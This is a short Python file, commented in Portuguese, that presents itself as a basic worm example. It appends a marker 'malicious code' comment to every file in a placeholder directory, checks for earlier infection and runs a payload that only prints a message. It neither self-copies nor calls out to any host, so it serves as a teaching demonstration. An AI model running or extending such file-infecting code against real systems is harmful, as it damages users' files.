"""

Exemplo básico de worm em python

"""

import os
import shutil
import glob

def propagate():
    # Define o diretório onde o worm buscará por arquivos para infectar
    target_directory = '/caminho/para/diretorio/alvo'

    # Obtém uma lista de arquivos no diretório alvo
    files = glob.glob(os.path.join(target_directory, '*'))

    # Infecta cada arquivo no diretório
    for file in files:
        # Ignora diretórios
        if os.path.isdir(file):
            continue

        # Verifica se o arquivo já está infectado
        if not is_infected(file):
            # Infecta o arquivo adicionando código malicioso
            with open(file, 'a') as f:
                f.write('# Código malicioso adicionado pelo worm')

def is_infected(file):
    # Verifica se o arquivo está infectado procurando a presença de código malicioso
    with open(file, 'r') as f:
        contents = f.read()
        if '# Código malicioso adicionado pelo worm' in contents:
            return True
    return False

def payload():
    # Define a ação que o worm executará nos sistemas infectados
    # Neste exemplo, apenas exibiremos uma mensagem
    print('Payload executado em um sistema infectado')

def main():
    # Propaga o worm
    propagate()

    # Executa a carga útil (payload) nos sistemas infectados
    payload()

if __name__ == "__main__":
    main()
